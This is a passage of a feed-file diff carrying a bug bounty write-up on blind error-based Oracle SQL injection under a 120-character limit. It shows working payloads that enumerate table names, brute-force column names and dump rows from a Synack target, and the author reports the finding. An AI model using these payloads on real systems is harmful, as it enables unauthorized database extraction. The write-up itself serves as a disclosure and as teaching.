+&lt;p&gt;We had to find a different solution that would limit the number of rows returned by the SQL query. MySQL has &lt;code&gt;LIMIT&lt;/code&gt; and &lt;code&gt;OFFSET&lt;/code&gt; statements that can be used to limit the number of rows. I knew a little about Oracle limits. Upon doing further Google searches, I found out that we need to use &lt;code&gt;OFFSET...FETCH&lt;/code&gt; statements if we wish to limit the results.&lt;/p&gt;
+&lt;p&gt;An example usage would be like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	CASE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		WHEN ((SELECT LENGTH(table_name,1,1) FROM all_tables OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)=0) THEN 1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		ELSE 1/0
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	END
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)=1 OR &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However, this payload would exceed our maximum limit of 120 characters. :(&lt;/p&gt;
+&lt;h3 id=&#34;finding-the-shortest-possible-payload&#34;&gt;Finding The Shortest Possible Payload&lt;/h3&gt;
+&lt;p&gt;I shifted my focus toward crafting the shortest payload that would give me a boolean response. I played around with the payload a bit and I discovered that in some places, spaces were optional. We could eliminate spaces!&lt;/p&gt;
+&lt;p&gt;For example, consider the following &lt;code&gt;CASE...WHEN&lt;/code&gt; payload&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;CASE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHEN&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;THEN&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ELSE&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;END&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 35 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This can be rewritten to eliminate spaces like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;CASE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHEN&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#66d9ef&#34;&gt;THEN&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ELSE&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;END&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 31 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Considering this in mind, I crafted the shortest possible payload that provided me with a boolean response as:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AND(CASE WHEN(1=1)THEN 1ELSE 1/0END)=1OR&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 47 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;By doing this, we effectively moved from 86 characters to 47 characters. This was a massive improvement!&lt;/p&gt;
+&lt;h3 id=&#34;successfully-dumping-table-names&#34;&gt;Successfully Dumping Table Names&lt;/h3&gt;
+&lt;p&gt;With our refined payload and using offsets, I went on to dump the table names. I skipped the first table that was &amp;ldquo;DUAL&amp;rdquo; and started dumping the second table name. To do this, I used the following payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AND(CASE WHEN((SELECT table_name FROM all_tables OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)&amp;gt;&amp;#39;&lt;/span&gt;A&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;)THEN 1ELSE 1/0END)=1OR&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 120 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Using this payload, I dumped the first three characters from the table name that was &amp;ldquo;&lt;strong&gt;SYS&lt;/strong&gt;&amp;rdquo;. After dumping the third character, the payload becomes exactly 120 characters long and we cannot dump any further.&lt;/p&gt;
+&lt;p&gt;I found a workaround for this by using the &lt;code&gt;LIKE&lt;/code&gt; statement and eliminating offsets and limits. Here is the payload that I used:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AND(CASE WHEN((SELECT COUNT(*) FROM all_tables WHERE table_name LIKE &amp;#39;&lt;/span&gt;SYS_______&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;)&amp;gt;0)THEN 1ELSE 1/0END)=1OR&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 114 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Enumerating the table name one character at a time, I found that the table name was &amp;ldquo;&lt;strong&gt;SYSTEMTBL$&lt;/strong&gt;&amp;rdquo;. I could not enumerate the last $ character because it was a bad character. However, I googled the table name and found out that it was also a system table and the table name ended with a $.&lt;/p&gt;
+&lt;p&gt;I tried to play around with the offset values to enumerate more table names but almost all of them turned out to be system tables.&lt;/p&gt;
+&lt;p&gt;To find a table that was not a system table, I did some guesswork. As I mentioned earlier in the blog, this application was a retest. I had already sent plenty of SQLis on this application. Due to this, I was fortunate enough to know the naming convention of the tables. I knew the table names had the following prefix: &amp;ldquo;&lt;strong&gt;SYN_&lt;/strong&gt;&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;I crafted a payload to check for tables that had the &amp;ldquo;&lt;strong&gt;SYN_&lt;/strong&gt;&amp;rdquo; prefix. The payload looked like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AND(CASE WHEN((SELECT COUNT(*) FROM all_tables WHERE table_name LIKE &amp;#39;&lt;/span&gt;SYN____&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;)=1)THEN 1ELSE 1/0END)=1OR&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 111 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This payload was successful and I enumerated the table name to be &amp;ldquo;&lt;strong&gt;SYN_NEW&lt;/strong&gt;&amp;rdquo;.&lt;/p&gt;
+&lt;h3 id=&#34;guessing-column-names&#34;&gt;Guessing Column Names&lt;/h3&gt;
+&lt;p&gt;Next up, we had to enumerate the column names from the &amp;ldquo;SYN_NEW&amp;rdquo; table. For this, I tried to craft a payload like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AND(CASE WHEN((SELECT OWNER FROM all_tab_columns WHERE table_name=&amp;#39;&lt;/span&gt;SYN_NEW&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ANDROWNUM=1)&amp;gt;0)THEN 1ELSE 1/0END)=1OR&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 119 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However, this payload would not work. The &lt;code&gt;(SELECT OWNER FROM all_tab_columns WHERE table_name=&#39;SYN_NEW&#39;ANDROWNUM=1)&lt;/code&gt; subquery returns a string and we must compare it with a string to get a meaningful result. Even if we try to compare it with the ASCII value of the first character, we would be limited to enumerating the first character of the column name. We had just enough space to fit a single character.&lt;/p&gt;
+&lt;p&gt;I could not think of anything from here. So, I decided to brute force the column names. To perform the brute force, I used the following payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AND(CASE WHEN((SELECT LENGTH(§test§) FROM SYN_NEW OFFSET 1ROWS FETCH NEXT 1ROWS ONLY)&amp;gt;0)THEN 1ELSE 1/0END)=1OR&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 115 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I brute-forced using the &lt;a href=&#34;https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt&#34;&gt;burp-parameter-names.txt&lt;/a&gt; wordlist.&lt;/p&gt;
+&lt;p&gt;And quickly enough, I found one column &amp;ldquo;&lt;strong&gt;user&lt;/strong&gt;&amp;rdquo;.&lt;/p&gt;
+&lt;h3 id=&#34;dumping-the-rows&#34;&gt;Dumping The Rows&lt;/h3&gt;
+&lt;p&gt;From here, the database dump was quite easy, I just used the following payload to dump one row at a time:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AND(CASE WHEN((SELECT user FROM SYN_NEW OFFSET 1ROW FETCH NEXT 1ROW ONLY)&amp;gt;&amp;#39;&lt;/span&gt;SYN&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;)THEN 1ELSE 1/0END)=1OR&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 108 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I enumerated the first row to be &amp;ldquo;&lt;strong&gt;SYN_WAS&lt;/strong&gt;&amp;rdquo;. To confirm that what we dumped was indeed a valid row and was not a fluke, I used the following payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AND(CASE WHEN((SELECT user FROM SYN_NEW OFFSET 1ROW FETCH NEXT 1ROW ONLY)=&amp;#39;&lt;/span&gt;SYN_WAS&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;)THEN 1ELSE 1/0END)=1OR&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 112 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you change from &amp;ldquo;&lt;strong&gt;SYN_WAS&lt;/strong&gt;&amp;rdquo; to something else like &amp;ldquo;&lt;strong&gt;SYN_WAR&lt;/strong&gt;&amp;rdquo;, the application will send a false response. Confirming that our row dump is valid.&lt;/p&gt;
+&lt;p&gt;Sent the report to Synack and they happily accepted the findings!&lt;/p&gt;
+&lt;h3 id=&#34;takeaways&#34;&gt;Takeaways&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;Keep taking notes of your vulnerabilities. You never know when they will become useful.&lt;/li&gt;
+&lt;li&gt;Bug bounties are often luck paired with hard work. If I had not found the SQL injections on this target in the past, I would never have guessed what naming structure the table names follow.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;I love doing technical discussions with the community! If you have a question about anything infosec-related, feel free to send me a DM on my &lt;a href=&#34;https://twitter.com/kuldeepdotexe&#34;&gt;Twitter&lt;/a&gt;/&lt;a href=&#34;https://www.instagram.com/kuldeepdotexe&#34;&gt;Instagram&lt;/a&gt;/&lt;a href=&#34;https://www.linkedin.com/in/kuldeep-pandya-13a26a167/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;EOF&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>120 Days of High Frequency Hunting</title>
       <link>https://kuldeep.io/posts/120-days-of-high-frequency-hunting/</link>
